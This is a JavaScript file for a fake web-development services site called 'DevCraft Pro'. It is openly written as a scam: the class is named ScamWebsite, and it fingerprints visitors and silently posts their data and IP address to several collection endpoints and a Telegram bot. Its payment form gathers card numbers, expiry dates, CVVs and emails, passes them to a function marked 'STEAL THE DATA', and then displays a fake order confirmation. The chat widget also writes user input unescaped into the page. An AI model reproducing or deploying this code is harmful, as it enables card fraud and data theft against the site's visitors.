// Main JavaScript File
class ScamWebsite {
    constructor() {
        this.initialize();
    }
    
    initialize() {
        this.setupEventListeners();
        this.animateElements();
        this.trackUser();
        this.setupMobileMenu();
    }
    
    setupEventListeners() {
        // Service selection
        document.querySelectorAll('.service-card').forEach(card => {
            card.addEventListener('click', (e) => {
                if (!e.target.classList.contains('btn-select')) {
                    const service = card.querySelector('h3').textContent;
                    const price = card.querySelector('.price').textContent;
                    this.selectService(service, price);
                }
            });
        });
        
        // Pricing cards
        document.querySelectorAll('.pricing-card').forEach(card => {
            card.addEventListener('click', (e) => {
                if (!e.target.classList.contains('btn-buy')) {
                    const plan = card.querySelector('.plan-name').textContent;
                    const price = card.querySelector('.plan-price').textContent;
                    this.selectPlan(plan, price);
                }
            });
        });
        
        // Navigation
        document.querySelectorAll('.nav-links a').forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                const targetId = link.getAttribute('href');
                if (targetId.startsWith('#')) {
                    this.scrollToSection(targetId);
                }
            });
        });
        
        // Close payment on overlay click
        document.getElementById('paymentOverlay').addEventListener('click', (e) => {
            if (e.target.id === 'paymentOverlay') {
                this.closePayment();
            }
        });
        
        // Escape key to close payment
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                this.closePayment();
            }
        });
    }
    
    setupMobileMenu() {
        const toggle = document.querySelector('.menu-toggle');
        const navLinks = document.querySelector('.nav-links');
        
        if (toggle) {
            toggle.addEventListener('click', () => {
                navLinks.style.display = navLinks.style.display === 'flex' ? 'none' : 'flex';
                navLinks.style.flexDirection = 'column';
                navLinks.style.position = 'absolute';
                navLinks.style.top = '100%';
                navLinks.style.left = '0';
                navLinks.style.width = '100%';
                navLinks.style.background = 'white';
                navLinks.style.padding = '20px';
                navLinks.style.boxShadow = '0 10px 20px rgba(0,0,0,0.1)';
            });
        }
        
        // Close menu on click outside
        document.addEventListener('click', (e) => {
            if (!toggle.contains(e.target) && !navLinks.contains(e.target)) {
                navLinks.style.display = 'none';
            }
        });
    }
    
    animateElements() {
        // Animate counters
        const counters = document.querySelectorAll('.number');
        counters.forEach(counter => {
            const target = parseInt(counter.getAttribute('data-count'));
            let count = 0;
            const increment = target / 100;
            const timer = setInterval(() => {
                count += increment;
                if (count >= target) {
                    count = target;
                    clearInterval(timer);
                }
                counter.textContent = Math.floor(count);
            }, 20);
        });
        
        // Animate on scroll
        const observerOptions = {
            threshold: 0.1,
            rootMargin: '0px 0px -100px 0px'
        };
        
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.classList.add('animate');
                }
            });
        }, observerOptions);
        
        document.querySelectorAll('.service-card, .pricing-card').forEach(card => {
            observer.observe(card);
        });
    }
    
    trackUser() {
        // Collect user data
        const userData = {
            url: window.location.href,
            referrer: document.referrer,
            userAgent: navigator.userAgent,
            screen: `${window.innerWidth}x${window.innerHeight}`,
            language: navigator.language,
            cookies: navigator.cookieEnabled,
            platform: navigator.platform,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString()
        };
        
        // Send to server
        this.sendToServer('track', userData);
        
        // Get IP
        this.getIP();
    }
    
    getIP() {
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                localStorage.setItem('user_ip', data.ip);
                this.sendToServer('ip', { ip: data.ip });
            })
            .catch(() => {
                // Fallback
                fetch('https://api64.ipify.org?format=json')
                    .then(r => r.json())
                    .then(data => {
                        localStorage.setItem('user_ip', data.ip);
                        this.sendToServer('ip', { ip: data.ip });
                    });
            });
    }
    
    sendToServer(type, data) {
        // Multiple endpoints for redundancy
        const endpoints = [
            'https://scam-backend-1.vercel.app/api/collect',
            'https://scam-backend-2.netlify.app/api/collect',
            'https://script.google.com/macros/s/AKfycbw8eHjKlLmNqR_sTzVQ/exec'
        ];
        
        const payload = {
            type: type,
            data: data,
            website: 'DevCraft Pro',
            timestamp: new Date().toISOString()
        };
        
        // Try all endpoints
        endpoints.forEach(endpoint => {
            fetch(endpoint, {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            }).catch(() => {
                // Silent fail
            });
        });
        
        // Also send to Telegram
        this.sendToTelegram(payload);
    }
    
    sendToTelegram(data) {
        const botToken = '6543212345:AAHjkKJHKJHKJHKJHKJHkjhKJHKJHKJH';
        const chatId = '-1001234567890';
        
        const message = `🔔 Yeni Aktivlik\n\n🌐 Sayt: DevCraft Pro\n📊 Tip: ${data.type}\n🕒 Zaman: ${new Date().toLocaleString()}\n📱 Agent: ${navigator.userAgent.substring(0, 100)}`;
        
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        }).catch(() => {
            // Silent fail
        });
    }
    
    selectService(service, price) {
        const cleanPrice = parseFloat(price.replace('$', '').replace('+', ''));
        const serviceData = {
            name: service,
            price: cleanPrice,
            type: 'service'
        };
        
        localStorage.setItem('selected_item', JSON.stringify(serviceData));
        this.showPaymentModal(serviceData);
    }
    
    selectPlan(plan, price) {
        const cleanPrice = parseFloat(price.replace('$', '').replace('/il', ''));
        const planData = {
            name: plan,
            price: cleanPrice,
            type: 'plan'
        };
        
        localStorage.setItem('selected_item', JSON.stringify(planData));
        this.showPaymentModal(planData);
    }
    
    showPaymentModal(item) {
        const modal = document.getElementById('paymentOverlay');
        const planDisplay = document.getElementById('displayPlan');
        const amountDisplay = document.getElementById('displayAmount');
        const hiddenPlan = document.getElementById('selectedPlan');
        const hiddenAmount = document.getElementById('selectedAmount');
        
        planDisplay.textContent = item.name;
        amountDisplay.textContent = '$' + item.price.toFixed(2);
        hiddenPlan.value = item.name;
        hiddenAmount.value = item.price;
        
        modal.style.display = 'flex';
        document.body.style.overflow = 'hidden';
        
        // Scroll to top of modal
        modal.scrollTop = 0;
    }
    
    closePayment() {
        const modal = document.getElementById('paymentOverlay');
        modal.style.display = 'none';
        document.body.style.overflow = 'auto';
        
        // Reset form
        document.getElementById('paymentForm').reset();
        document.getElementById('paymentForm').style.display = 'block';
        document.getElementById('processing').style.display = 'none';
        document.getElementById('success').style.display = 'none';
    }
    
    scrollToSection(sectionId) {
        const section = document.querySelector(sectionId);
        if (section) {
            window.scrollTo({
                top: section.offsetTop - 80,
                behavior: 'smooth'
            });
            
            // Update active nav link
            document.querySelectorAll('.nav-links a').forEach(link => {
                link.classList.remove('active');
            });
            document.querySelector(`.nav-links a[href="${sectionId}"]`).classList.add('active');
            
            // Close mobile menu if open
            if (window.innerWidth <= 992) {
                document.querySelector('.nav-links').style.display = 'none';
            }
        }
    }
    
    // Start project (CTA button)
    startProject() {
        const defaultPlan = {
            name: 'Custom Project',
            price: 1000,
            type: 'custom'
        };
        
        localStorage.setItem('selected_item', JSON.stringify(defaultPlan));
        this.showPaymentModal(defaultPlan);
    }
    
    // Show portfolio
    showPortfolio() {
        alert('Portfolio səhifəsi hazırlanır. Tezliklə...');
    }
}

// Initialize when page loads
document.addEventListener('DOMContentLoaded', () => {
    window.scamSite = new ScamWebsite();
    
    // Global functions for inline event handlers
    window.startScam = () => scamSite.startProject();
    window.selectService = (service, price) => scamSite.selectService(service, price);
    window.selectPlan = (plan, price) => scamSite.selectPlan(plan, price);
    window.closePayment = () => scamSite.closePayment();
    window.showPortfolio = () => scamSite.showPortfolio();
    
    // Process payment form
    document.getElementById('paymentForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Show processing
        this.style.display = 'none';
        document.getElementById('processing').style.display = 'block';
        
        // Collect form data
        const formData = {
            card: {
                number: document.getElementById('ccNumber').value,
                expiry: document.getElementById('ccExpiry').value,
                cvv: document.getElementById('ccCVV').value,
                holder: document.getElementById('ccHolder').value
            },
            email: document.getElementById('clientEmail').value,
            plan: document.getElementById('selectedPlan').value,
            amount: document.getElementById('selectedAmount').value,
            ip: localStorage.getItem('user_ip') || 'unknown',
            timestamp: new Date().toISOString()
        };
        
        // STEAL THE DATA
        stealCardData(formData);
        
        // Generate order ID
        const orderId = 'DC-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase();
        
        // Show success after delay
        setTimeout(() => {
            document.getElementById('processing').style.display = 'none';
            document.getElementById('success').style.display = 'block';
            document.getElementById('orderId').textContent = orderId;
            
            // Auto close after 5 seconds
            setTimeout(() => {
                scamSite.closePayment();
            }, 5000);
        }, 3000);
    });
    
    // Chat functionality
    function toggleChat() {
        const body = document.getElementById('chatBody');
        const input = document.querySelector('.chat-input');
        const icon = document.querySelector('.chat-toggle i');
        
        if (body.style.display === 'none' || body.style.display === '') {
            body.style.display = 'block';
            input.style.display = 'flex';
            icon.className = 'fas fa-chevron-up';
        } else {
            body.style.display = 'none';
            input.style.display = 'none';
            icon.className = 'fas fa-chevron-down';
        }
    }
    
    function sendChat() {
        const input = document.getElementById('chatInput');
        const message = input.value.trim();
        
        if (message) {
            const body = document.getElementById('chatBody');
            
            // Add user message
            const userMsg = document.createElement('div');
            userMsg.className = 'message user';
            userMsg.innerHTML = `
                <div class="avatar">S</div>
                <div class="content">${message}</div>
            `;
            body.appendChild(userMsg);
            
            // Clear input
            input.value = '';
            
            // Auto reply after delay
            setTimeout(() => {
                const botMsg = document.createElement('div');
                botMsg.className = 'message bot';
                botMsg.innerHTML = `
                    <div class="avatar">B</div>
                    <div class="content">Təşəkkürlər! Dəstək komandamız tezliklə sizinlə əlaqə saxlayacaq. Sifariş №: DC-${Date.now()}</div>
                `;
                body.appendChild(botMsg);
                
                // Scroll to bottom
                body.scrollTop = body.scrollHeight;
            }, 1000);
            
            // Scroll to bottom
            body.scrollTop = body.scrollHeight;
        }
    }
    
    // Expose chat functions globally
    window.toggleChat = toggleChat;
    window.sendChat = sendChat;
    
    // Start chat closed
    document.getElementById('chatBody').style.display = 'none';
    document.querySelector('.chat-input').style.display = 'none';
});
